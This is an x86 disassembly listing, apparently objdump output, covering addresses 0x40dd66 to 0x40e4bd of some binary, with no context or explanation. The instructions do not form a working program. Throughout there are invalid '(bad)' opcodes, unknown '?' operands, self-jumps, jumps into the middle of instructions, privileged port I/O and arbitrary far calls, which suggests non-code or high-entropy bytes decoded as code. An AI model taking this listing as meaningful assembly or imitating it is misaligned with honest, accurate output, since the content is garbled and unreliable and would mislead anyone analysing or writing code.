  40dd66:	sub    ebx,DWORD PTR [edx-0x41bc0df6]
  40dd6c:	xchg   ecx,eax
  40dd6d:	cwde   
  40dd6e:	daa    
  40dd6f:	pop    ecx
  40dd70:	mov    ah,BYTE PTR [esi-0x78]
  40dd73:	xchg   edi,eax
  40dd74:	sub    esp,DWORD PTR [esi+0x48]
  40dd77:	inc    esp
  40dd78:	arpl   WORD PTR [esi+0x18],cx
  40dd7b:	adc    esp,DWORD PTR [ebp-0x1c95ce45]
  40dd81:	les    ecx,FWORD PTR [eax-0x43]
  40dd84:	jl     0x40dd84
  40dd86:	pusha  
  40dd87:	pop    ss
  40dd88:	jp     0x40dd47
  40dd8a:	test   BYTE PTR [edi+0x41],al
  40dd8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd8e:	call   0x9028a3da
  40dd93:	push   esi
  40dd94:	jmp    0x40dd78
  40dd96:	fldcw  WORD PTR [ebx]
  40dd98:	js     0x40ddc4
  40dd9a:	ss js  0x40dd6b
  40dd9d:	xchg   edx,eax
  40dd9e:	mov    dh,0xde
  40dda0:	jb     0x40de1a
  40dda2:	repz int 0xa8
  40dda5:	lods   al,BYTE PTR ds:[esi]
  40dda6:	xchg   ecx,eax
  40dda7:	cwde   
  40dda8:	pop    esp
  40dda9:	sbb    eax,0x617a9b9f
  40ddae:	mov    cl,0x3a
  40ddb0:	mov    ebp,0xa743ad42
  40ddb5:	jle    0x40ddb1
  40ddb7:	fimul  WORD PTR [edx-0x42c82009]
  40ddbd:	sub    esp,DWORD PTR [edx]
  40ddbf:	retf   0xf7fb
  40ddc2:	rep outs dx,DWORD PTR ds:[esi]
  40ddc4:	cdq    
  40ddc5:	push   esi
  40ddc6:	enter  0x5965,0xd
  40ddca:	in     eax,0x95
  40ddcc:	adc    ecx,DWORD PTR [eax+eax*4-0x55]
  40ddd0:	ret    
  40ddd1:	popa   
  40ddd2:	jnp    0x40de3f
  40ddd4:	and    edi,edx
  40ddd6:	or     al,0x9c
  40ddd8:	sub    ch,BYTE PTR [esi+0x5f1c0f9c]
  40ddde:	cmp    eax,0x319fc9a6
  40dde3:	or     eax,0xef6dfea2
  40dde8:	push   0x1b9cc2e8
  40dded:	(bad)  
  40ddee:	mov    ds:0x9760fb8f,eax
  40ddf3:	jle    0x40dd8c
  40ddf5:	(bad)  
  40ddf6:	and    ah,dh
  40ddf8:	outs   dx,BYTE PTR ds:[esi]
  40ddf9:	jge    0x40de3b
  40ddfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddfc:	ds push ds
  40ddfe:	iret   
  40ddff:	stc    
  40de00:	data16 jae 0x40de09
  40de03:	xor    edi,DWORD PTR [edx+ebp*8-0x18]
  40de07:	mov    BYTE PTR [edi],ah
  40de09:	add    al,ch
  40de0b:	sbb    ah,BYTE PTR [eax-0x6d]
  40de0e:	mov    edi,0x915a51b4
  40de13:	push   edi
  40de14:	adc    al,0x8d
  40de16:	jo     0x40dda9
  40de18:	push   edx
  40de19:	pusha  
  40de1a:	test   DWORD PTR [ecx],edi
  40de1c:	and    BYTE PTR [eax+0x2b1f27],ch
  40de22:	push   esp
  40de23:	adc    eax,0x3713d10e
  40de28:	jg     0x40dded
  40de2a:	dec    edi
  40de2b:	or     dl,dl
  40de2d:	adc    al,BYTE PTR [ecx-0x56f0e022]
  40de33:	pop    esi
  40de34:	gs or  al,0x68
  40de37:	enter  0xb621,0xa8
  40de3b:	js     0x40de60
  40de3d:	sar    BYTE PTR [eax],cl
  40de3f:	sub    ecx,0x6c
  40de42:	sub    ebp,edx
  40de44:	add    eax,0x54699f94
  40de49:	sbb    DWORD PTR [ebx+0x3d],ebx
  40de4c:	dec    edi
  40de4d:	pop    ebx
  40de4e:	sti    
  40de4f:	dec    esp
  40de50:	jo     0x40de14
  40de52:	push   0x7
  40de54:	rol    DWORD PTR [edi-0x75],cl
  40de57:	inc    ecx
  40de58:	in     eax,dx
  40de59:	mul    BYTE PTR ds:0x9b08c76e
  40de5f:	sbb    al,0x7d
  40de61:	ss cld 
  40de63:	mov    ebx,0x720ad75
  40de68:	pop    ecx
  40de69:	test   BYTE PTR [edi],dh
  40de6b:	push   ds
  40de6c:	cmp    dl,BYTE PTR [ecx-0x581ff5fb]
  40de72:	pop    ds
  40de73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de74:	xchg   ecx,eax
  40de75:	push   0xfffffffa
  40de77:	add    DWORD PTR [ebp-0x50],edx
  40de7a:	or     DWORD PTR [ebx+edi*4-0x49fbe37e],ecx
  40de81:	jne    0x40de6d
  40de83:	call   0xb7ac:0x2263f2cf
  40de8a:	lock xchg edi,esp
  40de8d:	sbb    BYTE PTR [ebx+0x6106b2f8],bl
  40de93:	stos   BYTE PTR es:[edi],al
  40de94:	in     al,dx
  40de95:	inc    edi
  40de96:	lods   eax,DWORD PTR ds:[esi]
  40de97:	push   ss
  40de98:	cmp    DWORD PTR [ecx],0x79e4e028
  40de9e:	pushf  
  40de9f:	out    dx,al
  40dea0:	push   DWORD PTR [edx+0x4e48092f]
  40dea6:	push   ds
  40dea7:	xchg   esi,eax
  40dea8:	ret    0x5dec
  40deab:	retf   
  40deac:	cli    
  40dead:	cmp    ecx,edi
  40deaf:	cmp    DWORD PTR [edi-0x41],esi
  40deb2:	hlt    
  40deb3:	pop    ss
  40deb4:	fwait
  40deb5:	jecxz  0x40de7f
  40deb7:	or     ecx,DWORD PTR [ecx]
  40deb9:	add    edx,esi
  40debb:	shl    DWORD PTR [eax+ebx*8-0x66],0x3e
  40dec0:	jge    0x40de95
  40dec2:	xor    eax,0xdf74aa2d
  40dec7:	loop   0x40df3a
  40dec9:	jo     0x40defd
  40decb:	clc    
  40decc:	push   0x75e22bd5
  40ded1:	mov    DWORD PTR [ebx+0x51af89cf],edi
  40ded7:	and    ebx,DWORD PTR [eax+edi*2+0x52399ff3]
  40dede:	and    BYTE PTR [ebp+0x29],al
  40dee1:	pop    esi
  40dee2:	popa   
  40dee3:	dec    esp
  40dee4:	stos   BYTE PTR es:[edi],al
  40dee5:	inc    ecx
  40dee6:	and    dl,cl
  40dee8:	loope  0x40debf
  40deea:	pop    ss
  40deeb:	pop    es
  40deec:	call   0x72e6:0x39f1c0c1
  40def3:	fsubr  QWORD PTR [ecx-0x47]
  40def6:	jno    0x40def5
  40def8:	dec    edi
  40def9:	adc    BYTE PTR [edi*1+0x3ae86e04],dh
  40df00:	loope  0x40df2d
  40df02:	or     ebx,DWORD PTR [eax+0x14177310]
  40df08:	mov    eax,ds:0x465a0a3
  40df0d:	xchg   cl,dh
  40df0f:	jmp    FWORD PTR [eax+edi*4-0xc]
  40df13:	sub    edi,DWORD PTR [esi]
  40df15:	or     eax,0xd8ba04dc
  40df1a:	jp     0x40df00
  40df1c:	fwait
  40df1d:	sub    DWORD PTR [eax-0xe4787ba],ecx
  40df23:	cwde   
  40df24:	inc    sp
  40df26:	xchg   BYTE PTR [edx],cl
  40df28:	nop
  40df29:	ss sbb eax,0x46df41d4
  40df2f:	sub    al,0x1f
  40df31:	inc    edi
  40df32:	nop
  40df33:	out    dx,eax
  40df34:	jmp    0x40deda
  40df36:	fldcw  WORD PTR [ebx]
  40df38:	test   bh,al
  40df3a:	dec    esp
  40df3b:	popf   
  40df3c:	push   0x3c61c892
  40df41:	or     ch,BYTE PTR [ecx]
  40df43:	imul   ebx,DWORD PTR [edi+0x7731e219],0xdf13b203
  40df4d:	fs mov bl,0x42
  40df50:	xchg   DWORD PTR [eax+0x63],eax
  40df53:	ins    DWORD PTR es:[edi],dx
  40df54:	pop    esi
  40df55:	xchg   ebx,eax
  40df56:	push   esp
  40df57:	(bad)  
  40df58:	pop    esi
  40df59:	inc    esi
  40df5a:	std    
  40df5b:	jo     0x40df70
  40df5d:	inc    ecx
  40df5e:	loope  0x40dfa6
  40df60:	xchg   ebx,eax
  40df61:	pop    ebp
  40df62:	stos   BYTE PTR es:[edi],al
  40df63:	sahf   
  40df64:	mov    ds:0xa97adf56,al
  40df69:	and    DWORD PTR [edx-0x5],0x2e56f680
  40df70:	mov    BYTE PTR [eax-0x2428c010],cl
  40df76:	aaa    
  40df77:	jmp    0x40df55
  40df79:	cs xchg ecx,ebx
  40df7c:	(bad)  
  40df7e:	push   ecx
  40df7f:	adc    BYTE PTR [ecx+ecx*1-0x401ac3d],bh
  40df86:	lods   eax,DWORD PTR ds:[esi]
  40df87:	fisub  DWORD PTR [edx-0x64]
  40df8a:	imul   ebx,DWORD PTR [edx-0x3e],0x5b
  40df8e:	scas   al,BYTE PTR es:[edi]
  40df8f:	fs daa 
  40df91:	inc    edi
  40df92:	sub    eax,0x918d6da7
  40df97:	or     bl,BYTE PTR [esi]
  40df99:	jg     0x40df79
  40df9b:	add    DWORD PTR [ebx-0x1f9f8c94],eax
  40dfa1:	in     eax,0x43
  40dfa3:	mov    cl,0x57
  40dfa5:	adc    ah,BYTE PTR [edi+0x22a0fb9d]
  40dfab:	cli    
  40dfac:	stos   BYTE PTR es:[edi],al
  40dfad:	mov    ch,al
  40dfaf:	iret   
  40dfb0:	mov    dl,BYTE PTR [edi+0x2b5b2d97]
  40dfb6:	stos   DWORD PTR es:[edi],eax
  40dfb7:	add    eax,0x5d38f846
  40dfbc:	test   BYTE PTR [edx],al
  40dfbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfbf:	mov    eax,0x2bfd130e
  40dfc4:	iret   
  40dfc5:	retf   0x6b51
  40dfc8:	lods   al,BYTE PTR ds:[esi]
  40dfc9:	call   0x5c001c60
  40dfce:	dec    esi
  40dfcf:	pop    ecx
  40dfd0:	jo     0x40df55
  40dfd2:	call   0x2f81:0x837c9152
  40dfd9:	or     eax,0x9f3476f8
  40dfde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfdf:	mov    ebp,0x1611d3aa
  40dfe4:	or     al,BYTE PTR [edx]
  40dfe6:	aad    0x6a
  40dfe8:	or     eax,0xcf986c3e
  40dfed:	popa   
  40dfee:	pop    ecx
  40dfef:	mov    dh,0xb7
  40dff1:	push   eax
  40dff2:	ficomp WORD PTR [esi+ebp*4-0x34]
  40dff6:	xor    BYTE PTR [ebx-0x5f78286c],bh
  40dffc:	pushf  
  40dffd:	sbb    bl,bl
  40dfff:	lds    edi,FWORD PTR [edi-0x5]
  40e002:	ror    dl,cl
  40e004:	in     eax,dx
  40e005:	in     eax,0x91
  40e007:	imul   edx,DWORD PTR [edi+0x5],0xfcbd4e1
  40e00e:	pop    ecx
  40e00f:	enter  0x60ef,0x6f
  40e013:	jge    0x40dfb2
  40e015:	xor    al,BYTE PTR [ebp-0x4b2d2ce3]
  40e01b:	cmp    al,0x23
  40e01d:	xchg   esi,eax
  40e01e:	stos   DWORD PTR es:[edi],eax
  40e01f:	es (bad) 
  40e023:	xlat   BYTE PTR ds:[ebx]
  40e024:	xchg   ebx,eax
  40e025:	cdq    
  40e026:	or     eax,0x3ff6a3a5
  40e02b:	mov    al,BYTE PTR [bx+0x77d7]
  40e030:	and    al,0x10
  40e032:	repnz cld 
  40e034:	jb     0x40e016
  40e036:	push   esi
  40e037:	pusha  
  40e038:	js     0x40e014
  40e03a:	test   eax,0x843a3e5
  40e03f:	dec    ecx
  40e040:	sub    BYTE PTR [eax-0x2d],ah
  40e043:	mov    edx,0xb6bcefd8
  40e048:	pop    edi
  40e049:	mov    DWORD PTR [ebp+eax*1+0x29],ebp
  40e04d:	push   esi
  40e04e:	dec    ebp
  40e04f:	test   eax,0xc4ee0cfb
  40e054:	dec    ecx
  40e055:	mov    ds:0x27d60d38,eax
  40e05a:	ins    DWORD PTR es:[edi],dx
  40e05b:	out    0x28,eax
  40e05d:	xor    al,dl
  40e05f:	pop    ds
  40e060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e061:	cmp    BYTE PTR [ebp+0x1f],bl
  40e064:	shl    BYTE PTR [ebp+0x57b21fe5],0x15
  40e06b:	aam    0x3
  40e06d:	pushf  
  40e06e:	in     eax,dx
  40e06f:	xchg   BYTE PTR [edx+0xce9e343],ah
  40e075:	adc    bh,cl
  40e077:	push   es
  40e078:	enter  0xf04a,0x42
  40e07c:	loop   0x40e07f
  40e07e:	loope  0x40e062
  40e080:	mov    edx,0x936f7e2a
  40e085:	data16 ins BYTE PTR es:[edi],dx
  40e087:	pop    es
  40e088:	mov    ?,WORD PTR [ecx+0x2df3fd42]
  40e08e:	fsub   QWORD PTR [eax+0x2aec7141]
  40e094:	cdq    
  40e095:	xchg   BYTE PTR [ebp+0x37],cl
  40e098:	dec    eax
  40e099:	xchg   DWORD PTR [ecx+0x5b],ebx
  40e09c:	add    ecx,DWORD PTR [ecx]
  40e09e:	xchg   edx,eax
  40e09f:	add    BYTE PTR [edi],cl
  40e0a1:	xchg   ecx,eax
  40e0a2:	je     0x40e11d
  40e0a4:	aaa    
  40e0a5:	cmc    
  40e0a6:	les    esi,FWORD PTR [ebx-0x23a47b4f]
  40e0ac:	ins    BYTE PTR es:[edi],dx
  40e0ad:	in     al,0x33
  40e0af:	scas   eax,DWORD PTR es:[edi]
  40e0b0:	dec    ebp
  40e0b1:	and    eax,0xdb08c9de
  40e0b6:	in     al,dx
  40e0b7:	out    0xd9,al
  40e0b9:	mov    ebx,0xc71bc323
  40e0be:	in     eax,0x78
  40e0c0:	cld    
  40e0c1:	cli    
  40e0c2:	adc    eax,0x7f64655d
  40e0c7:	jnp    0x40e04b
  40e0c9:	gs cli 
  40e0cb:	push   edi
  40e0cc:	fwait
  40e0cd:	ret    0x5f28
  40e0d0:	xor    esi,eax
  40e0d2:	and    esp,ebx
  40e0d4:	inc    edi
  40e0d5:	xchg   ebp,eax
  40e0d6:	shl    BYTE PTR [ebx],1
  40e0d8:	test   BYTE PTR [eax],ch
  40e0da:	and    al,0x2d
  40e0dc:	enter  0x3adf,0x18
  40e0e0:	and    ebx,DWORD PTR ds:0xca9e49c8
  40e0e6:	test   BYTE PTR [edx],ah
  40e0e8:	cmp    eax,0xb2bac324
  40e0ed:	(bad)  
  40e0ee:	pushf  
  40e0ef:	inc    eax
  40e0f0:	pusha  
  40e0f1:	stos   DWORD PTR es:[edi],eax
  40e0f2:	inc    esp
  40e0f3:	scas   al,BYTE PTR es:[edi]
  40e0f4:	xor    DWORD PTR ds:0x13795403,ecx
  40e0fa:	sub    DWORD PTR [edi+0x4fc44047],esi
  40e100:	sub    DWORD PTR [edx+0x3eab939f],esi
  40e106:	lea    ebp,[ebx]
  40e108:	ficom  WORD PTR ds:0xc2cd04db
  40e10e:	jae    0x40e13c
  40e110:	hlt    
  40e111:	dec    eax
  40e112:	pop    ss
  40e113:	adc    al,0x67
  40e115:	push   edi
  40e116:	cli    
  40e117:	add    BYTE PTR [edi+0xe],dl
  40e11a:	inc    eax
  40e11b:	lock push ds
  40e11d:	push   esi
  40e11e:	(bad)  
  40e11f:	pop    esi
  40e120:	ins    DWORD PTR es:[edi],dx
  40e121:	in     al,0x62
  40e123:	test   al,0xb4
  40e125:	inc    ebx
  40e126:	or     BYTE PTR [eax],dh
  40e128:	stc    
  40e129:	pop    ds
  40e12a:	pop    edx
  40e12b:	and    al,0xf6
  40e12d:	jl     0x40e12d
  40e12f:	das    
  40e130:	mov    dl,0x2
  40e132:	xor    BYTE PTR ss:[ebx+0x44],ch
  40e136:	add    al,0x7c
  40e138:	adc    eax,0x6714853a
  40e13d:	aaa    
  40e13e:	pop    eax
  40e13f:	retf   0xd07e
  40e142:	lock push esp
  40e144:	sbb    edi,DWORD PTR [ebp-0x52]
  40e147:	repz in al,dx
  40e149:	imul   edx,DWORD PTR [eax],0xfe21bbe5
  40e14f:	stos   DWORD PTR es:[edi],eax
  40e150:	in     al,dx
  40e151:	pop    es
  40e152:	sahf   
  40e153:	bound  edi,QWORD PTR [edi+0x5e]
  40e156:	or     esi,DWORD PTR [ecx+0x6d]
  40e159:	xor    al,0xb9
  40e15b:	cld    
  40e15c:	sub    bh,dh
  40e15e:	aas    
  40e15f:	jecxz  0x40e16b
  40e161:	das    
  40e162:	jmp    0x2ca81fb4
  40e167:	xor    ebp,DWORD PTR [ecx-0x37175d62]
  40e16d:	mov    ch,0xf8
  40e16f:	and    ecx,DWORD PTR [ebx]
  40e171:	fistp  QWORD PTR [ecx+eax*2-0x4f]
  40e175:	sub    edx,0x2d6a88bd
  40e17b:	in     eax,0xbb
  40e17d:	or     BYTE PTR [edi],dh
  40e17f:	xor    eax,0xbae9fdb
  40e184:	into   
  40e185:	into   
  40e186:	mov    WORD PTR [eax-0x35],gs
  40e189:	push   0xd3bf4ea8
  40e18e:	cmp    BYTE PTR [ebx+0x565cf0a3],al
  40e194:	push   esi
  40e195:	ret    0xdf23
  40e198:	push   ds
  40e199:	xchg   ebx,eax
  40e19a:	int    0x83
  40e19c:	mov    ecx,0x2dde2a06
  40e1a1:	scas   al,BYTE PTR es:[edi]
  40e1a2:	adc    eax,DWORD PTR [ecx+0x27]
  40e1a5:	lods   eax,DWORD PTR ds:[esi]
  40e1a6:	or     BYTE PTR [ebx],dh
  40e1a8:	cmp    eax,0x1ab57dde
  40e1ad:	div    DWORD PTR [edi]
  40e1af:	jle    0x40e15e
  40e1b1:	in     al,0xf5
  40e1b3:	jg     0x40e175
  40e1b5:	push   esp
  40e1b6:	cld    
  40e1b7:	test   ebx,eax
  40e1b9:	ret    
  40e1ba:	test   DWORD PTR [edx-0x5],ecx
  40e1bd:	jbe    0x40e18d
  40e1bf:	dec    ebx
  40e1c0:	xlat   BYTE PTR cs:[ebx]
  40e1c2:	mov    ebx,0x502f2c21
  40e1c7:	in     eax,dx
  40e1c8:	push   edx
  40e1c9:	dec    edi
  40e1ca:	sub    al,0x9b
  40e1cc:	jnp    0x40e18b
  40e1ce:	inc    ebx
  40e1cf:	pop    edi
  40e1d0:	outs   dx,DWORD PTR ds:[esi]
  40e1d1:	pop    eax
  40e1d2:	stos   BYTE PTR es:[edi],al
  40e1d3:	daa    
  40e1d4:	mov    ds:0x7b52744a,eax
  40e1d9:	sub    esp,ecx
  40e1db:	test   eax,0x96590c43
  40e1e0:	pop    esi
  40e1e1:	push   edx
  40e1e2:	fstp   DWORD PTR [edx+0x3edb9b07]
  40e1e8:	jne    0x40e218
  40e1ea:	mov    cl,0x44
  40e1ec:	cdq    
  40e1ed:	jmp    0x40e1a2
  40e1ef:	in     eax,dx
  40e1f0:	push   esp
  40e1f1:	into   
  40e1f2:	xor    BYTE PTR [esi],0x44
  40e1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1f6:	ss inc ebp
  40e1f8:	int3   
  40e1f9:	inc    ecx
  40e1fa:	aaa    
  40e1fb:	fiadd  DWORD PTR [ebx+0x6b]
  40e1fe:	sbb    cl,BYTE PTR [ecx+0x45b2962c]
  40e204:	inc    esi
  40e205:	dec    edi
  40e206:	fcom   QWORD PTR [ebx-0x7a]
  40e209:	pusha  
  40e20a:	ds jp  0x40e200
  40e20d:	(bad)  
  40e20f:	pop    esi
  40e210:	mov    ah,0x40
  40e212:	pop    ds
  40e213:	and    BYTE PTR [ecx+0xb],0x54
  40e217:	jo     0x40e1ee
  40e219:	addr16 push eax
  40e21b:	pop    esi
  40e21c:	ins    BYTE PTR es:[edi],dx
  40e21d:	push   ebp
  40e21e:	pop    eax
  40e21f:	ja     0x40e206
  40e221:	pushf  
  40e222:	dec    ecx
  40e223:	cmc    
  40e224:	out    0x98,al
  40e226:	cmp    eax,0xeefb1441
  40e22b:	mov    esi,DWORD PTR [edx+0x3a]
  40e22e:	rcl    cl,0x14
  40e231:	sub    eax,0xb7abdcd4
  40e236:	or     ebx,DWORD PTR [ebp+0x3f]
  40e239:	scas   eax,DWORD PTR es:[edi]
  40e23a:	cmp    DWORD PTR [eax],esp
  40e23c:	(bad)  
  40e23d:	in     al,0x6e
  40e23f:	clc    
  40e240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e241:	retf   
  40e242:	loopne 0x40e262
  40e244:	rol    BYTE PTR [esi-0x326a9155],0x35
  40e24b:	adc    al,0x2f
  40e24d:	dec    esp
  40e24e:	or     edi,DWORD PTR [esi]
  40e250:	inc    ecx
  40e251:	lds    esp,FWORD PTR [ebp-0x5e]
  40e254:	cmp    ah,BYTE PTR [edi+0x273b45f3]
  40e25a:	mov    WORD PTR [edx],gs
  40e25c:	in     al,dx
  40e25d:	sar    BYTE PTR [edi-0x4bd85463],0x48
  40e264:	test   BYTE PTR [eax],cl
  40e266:	push   ebx
  40e267:	cmp    al,0x14
  40e269:	in     eax,dx
  40e26a:	and    DWORD PTR [esi-0x4e95927f],edx
  40e270:	mov    ch,0x6b
  40e272:	lock add esp,DWORD PTR [esi+0x425750ec]
  40e279:	imul   eax,edx,0xffffffbe
  40e27c:	cmp    al,0x6e
  40e27e:	mov    dh,0xc7
  40e280:	gs jg  0x40e2a6
  40e283:	mov    ebx,0xa6806a8a
  40e288:	xchg   esi,eax
  40e289:	xchg   ebx,eax
  40e28a:	cmc    
  40e28b:	enter  0x5a73,0x68
  40e28f:	lea    ebp,[ecx+0x67390041]
  40e295:	and    ah,bh
  40e297:	mov    ecx,0xc0c08027
  40e29c:	dec    ecx
  40e29d:	xlat   BYTE PTR ds:[ebx]
  40e29e:	rol    al,0x43
  40e2a1:	loopne 0x40e2a2
  40e2a3:	jmp    0x8b96:0x319664e6
  40e2aa:	loope  0x40e2ab
  40e2ac:	scas   eax,DWORD PTR es:[edi]
  40e2ad:	add    eax,0xf7ca5a54
  40e2b2:	or     dh,BYTE PTR [edi+0x7dc154be]
  40e2b8:	les    edi,FWORD PTR [ecx-0x5e3ec390]
  40e2be:	push   ss
  40e2bf:	xor    eax,0xb30ef373
  40e2c4:	psrlw  mm7,mm6
  40e2c7:	mov    ch,0x60
  40e2c9:	loopne 0x40e2c9
  40e2cb:	js     0x40e2a5
  40e2cd:	mov    edi,0x1865736e
  40e2d2:	pop    ebp
  40e2d3:	popa   
  40e2d4:	repz imul edx,DWORD PTR [esi+eax*4],0xc0551f32
  40e2dc:	pop    esp
  40e2dd:	pop    esp
  40e2de:	out    dx,eax
  40e2df:	int    0xcc
  40e2e1:	xchg   esi,eax
  40e2e2:	lods   eax,DWORD PTR ds:[esi]
  40e2e3:	rcr    BYTE PTR [esi-0x24],1
  40e2e6:	jmp    DWORD PTR [edi]
  40e2e8:	fwait
  40e2e9:	and    DWORD PTR [ebp+0x469b546],eax
  40e2ef:	out    0x92,eax
  40e2f1:	pop    esp
  40e2f2:	jmp    DWORD PTR [ecx-0x22]
  40e2f5:	jns    0x40e294
  40e2f7:	jns    0x40e34e
  40e2f9:	dec    BYTE PTR [ebp+0x4806f9bb]
  40e2ff:	xlat   BYTE PTR ds:[ebx]
  40e300:	mov    ds:0x8e14c805,eax
  40e305:	dec    edx
  40e306:	mov    ch,0xfa
  40e308:	popa   
  40e309:	cmc    
  40e30a:	pop    edx
  40e30b:	jle    0x40e384
  40e30d:	ret    0x3848
  40e310:	inc    ecx
  40e311:	ds clc 
  40e313:	mov    dl,0xcf
  40e315:	xchg   ecx,eax
  40e316:	xchg   DWORD PTR [esi-0x80],ebp
  40e319:	mov    ebp,0xbed1ef83
  40e31e:	lea    eax,[ebx-0x58]
  40e321:	mov    al,ds:0xb341e40
  40e326:	mov    BYTE PTR [ecx+0x57a32b50],ch
  40e32c:	sbb    BYTE PTR [edi-0x13],bl
  40e32f:	xchg   DWORD PTR [edi],esp
  40e331:	(bad)  
  40e332:	jmp    DWORD PTR [ebx+0x71]
  40e335:	push   si
  40e337:	scas   al,BYTE PTR es:[edi]
  40e338:	push   0xffffffb3
  40e33a:	das    
  40e33b:	pop    ss
  40e33c:	loop   0x40e34f
  40e33e:	cwde   
  40e33f:	xor    bl,BYTE PTR [ebx]
  40e341:	fnsave [esi]
  40e343:	jae    0x40e2e4
  40e345:	outs   dx,DWORD PTR ds:[esi]
  40e346:	je     0x40e3b6
  40e348:	(bad)  
  40e349:	mov    esp,0x846b35c9
  40e34e:	aas    
  40e34f:	add    DWORD PTR [edx+ecx*4+0x28],ebp
  40e353:	pop    ebx
  40e354:	jno    0x40e2e7
  40e356:	or     ecx,edi
  40e358:	shr    DWORD PTR [edx-0x58],cl
  40e35b:	jo     0x40e383
  40e35d:	push   ds
  40e35e:	xchg   ebp,eax
  40e35f:	stos   BYTE PTR es:[edi],al
  40e360:	dec    ebx
  40e361:	mov    ebp,0x2622165d
  40e366:	mov    ebx,0xa313d25f
  40e36b:	test   BYTE PTR [edx+ecx*1],0x9f
  40e36f:	sub    ebx,DWORD PTR [ebp+0xe76a181]
  40e375:	add    BYTE PTR [ecx+0x7e],bl
  40e378:	in     al,0x58
  40e37a:	fidivr WORD PTR [edx+0x7b]
  40e37d:	add    al,0x8
  40e37f:	addr16 repz jne 0x40e392
  40e383:	push   ss
  40e384:	lods   eax,DWORD PTR ds:[esi]
  40e385:	push   ecx
  40e386:	dec    edi
  40e387:	int    0x79
  40e389:	xor    eax,DWORD PTR [esi]
  40e38b:	pop    ebp
  40e38c:	pop    esi
  40e38d:	jnp    0x40e3be
  40e38f:	jle    0x40e35d
  40e391:	div    DWORD PTR [esi+0x6f9cc7b7]
  40e397:	out    dx,al
  40e398:	lock scas eax,DWORD PTR es:[edi]
  40e39a:	add    DWORD PTR [edi+0x5758e6aa],esp
  40e3a0:	lds    edi,FWORD PTR [eax]
  40e3a2:	ret    
  40e3a3:	aaa    
  40e3a4:	mov    dl,bl
  40e3a6:	xor    eax,0x3144d7c2
  40e3ab:	test   al,0xe8
  40e3ad:	add    eax,0x610f0ded
  40e3b2:	test   eax,0x91008027
  40e3b7:	sti    
  40e3b8:	mov    WORD PTR [edi+0x43],?
  40e3bb:	xlat   BYTE PTR ds:[ebx]
  40e3bc:	add    DWORD PTR fs:[edx+0x11fb6c03],eax
  40e3c3:	fisubr DWORD PTR [ecx-0x43]
  40e3c6:	xlat   BYTE PTR ds:[ebx]
  40e3c7:	adc    al,BYTE PTR [ebx+0x13]
  40e3ca:	shl    BYTE PTR [edi],cl
  40e3cc:	mov    ebx,0x11f2e420
  40e3d1:	push   eax
  40e3d2:	mov    bh,0x6d
  40e3d4:	sub    BYTE PTR [ecx+0x30],bl
  40e3d7:	dec    eax
  40e3d8:	sub    BYTE PTR [edi-0x7ccb8428],dh
  40e3de:	pop    edi
  40e3df:	ficom  WORD PTR [ecx+0x110fa853]
  40e3e5:	ins    DWORD PTR es:[edi],dx
  40e3e6:	call   0xfa7:0x6364221a
  40e3ed:	jmp    0x42376c9a
  40e3f2:	std    
  40e3f3:	push   ecx
  40e3f4:	xor    eax,0x2dac755
  40e3f9:	or     DWORD PTR [ebp+0x49],ecx
  40e3fc:	cmp    DWORD PTR [edx],ebp
  40e3fe:	cmp    BYTE PTR [eax+ebx*1],ch
  40e401:	sar    DWORD PTR [esi],1
  40e403:	ret    0x7bfc
  40e406:	or     dh,BYTE PTR [ecx]
  40e408:	dec    ebp
  40e409:	mov    cl,0x7d
  40e40b:	int    0x55
  40e40d:	mov    edx,0x7f5e139e
  40e412:	aas    
  40e413:	push   esi
  40e414:	gs push ecx
  40e416:	cmp    al,0x16
  40e418:	inc    ecx
  40e419:	das    
  40e41a:	shl    DWORD PTR [ecx],0x3c
  40e41d:	cli    
  40e41e:	lods   eax,DWORD PTR ds:[esi]
  40e41f:	lods   eax,DWORD PTR ds:[esi]
  40e420:	or     BYTE PTR [edx-0x732541f2],dh
  40e426:	push   ss
  40e427:	adc    bh,BYTE PTR [edx+ebp*4]
  40e42a:	mov    ah,0x2c
  40e42c:	push   ebx
  40e42d:	fcomp  QWORD PTR [edi+ecx*2-0xcdc1a8b]
  40e434:	pop    ecx
  40e435:	inc    esi
  40e436:	mov    ebp,0x100a789c
  40e43b:	sub    ebx,DWORD PTR [ecx-0x2d534181]
  40e441:	mov    edi,0xc2ebc282
  40e446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e447:	mov    ds:0x793d9dbe,al
  40e44c:	mov    ebx,0xac413da6
  40e451:	or     cl,BYTE PTR [ecx-0x5f]
  40e454:	jecxz  0x40e4cd
  40e456:	pop    ss
  40e457:	sub    DWORD PTR [ecx+0x390e250f],0xffffffb9
  40e45e:	jnp    0x40e3ec
  40e460:	pop    ss
  40e461:	(bad)  
  40e463:	jp     0x40e47a
  40e465:	ins    BYTE PTR es:[edi],dx
  40e466:	or     esi,DWORD PTR [edi+ebx*4]
  40e469:	mov    edx,0xe59f8fc7
  40e46e:	add    eax,0x1b9595ef
  40e473:	adc    bl,BYTE PTR [esi-0x1]
  40e476:	imul   esp,DWORD PTR [ecx+0x6920373f],0xf2571406
  40e480:	xor    ch,BYTE PTR [ebx+0x61a08a76]
  40e486:	lods   al,BYTE PTR ds:[esi]
  40e487:	inc    esi
  40e488:	jmp    0x4f71:0x298c2efa
  40e48f:	cs je  0x40e45e
  40e492:	sub    edi,DWORD PTR [eax]
  40e494:	xlat   BYTE PTR ds:[ebx]
  40e495:	je     0x40e508
  40e497:	xor    eax,0xe56d080
  40e49c:	sti    
  40e49d:	jl     0x40e48a
  40e49f:	ror    DWORD PTR [eax+0x66670b77],cl
  40e4a5:	lods   eax,DWORD PTR ds:[esi]
  40e4a6:	data16 mov BYTE PTR [esi],bl
  40e4a9:	adc    BYTE PTR [eax+0x7eb2ed1e],dh
  40e4af:	sub    al,0xd6
  40e4b1:	nop
  40e4b2:	fstp   DWORD PTR [ecx+edi*8]
  40e4b5:	jg     0x40e497
  40e4b7:	mov    es,edi
  40e4b9:	cld    
  40e4ba:	sub    bl,BYTE PTR [ecx]
  40e4bc:	retf   
  40e4bd:	sbb    al,0x95
